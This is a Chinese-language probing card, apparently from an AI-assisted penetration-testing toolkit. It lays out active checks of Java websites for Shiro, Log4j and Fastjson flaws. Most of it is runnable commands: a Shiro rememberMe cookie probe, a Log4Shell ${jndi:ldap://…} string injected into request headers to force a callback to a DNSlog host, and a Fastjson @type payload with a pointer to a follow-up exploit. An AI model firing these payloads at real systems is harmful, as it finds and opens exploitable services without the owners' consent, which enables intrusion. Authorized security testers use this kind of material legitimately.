# Java 站三件套主动探测卡（≤50行）

**触发**: 确认 Java 味(Spring Boot头/X-Application-Context/Whitelabel/JSON错误格式/.do后缀) → **立即主动探测三件套，不依赖被动等类名泄露**。技术栈第⑦层(组件)不许留"未测"。

## 1. Shiro (5秒)
```bash
curl -sk -o /dev/null -D - <目标> -H "Cookie: rememberMe=test"
# 响应头 rememberMe=deleteMe => 命中 → 爆破卡 shiro-rememberme-fast.md
```

## 2. Log4j (0成本, Java站任意请求顺手带)
```bash
cd D:\Desktop\Claude\tools\dnslog_helper
python dnslog.py fire --type log4j --target <url> --watch 60
# 注入 X-Api-Version / X-Forwarded-For / Referer = ${jndi:ldap://<域>}
# 回连 = 命中; 顺带带JDK版本用 --type log4jver
```

## 3. Fastjson (仅 JSON 接口)
```bash
python dnslog.py fire --type fastjson --target <url> --data '{"k":"{D}"}' --watch 60
# @type Inet4Address 回连 = 命中 → ≤1.2.83 CVE-2026-16723 jar:http 兜底见三件套手册
```

## 4. 记录与止损
- 每项结果写入技术栈清单: 命中X / 未发现Y，**第⑦层不允许"未测"**
- 0 回连 = 目标出站不通 或 无此组件 → 止损切链路（产品N-day/登录侧/业务功能）
- 非 Java 站跳过（PHP/ASP/静态），不无脑逐站扫

详见: `tools/knowledge_base/techniques/kb_fastjson_shiro_log4j_master_2026.md`
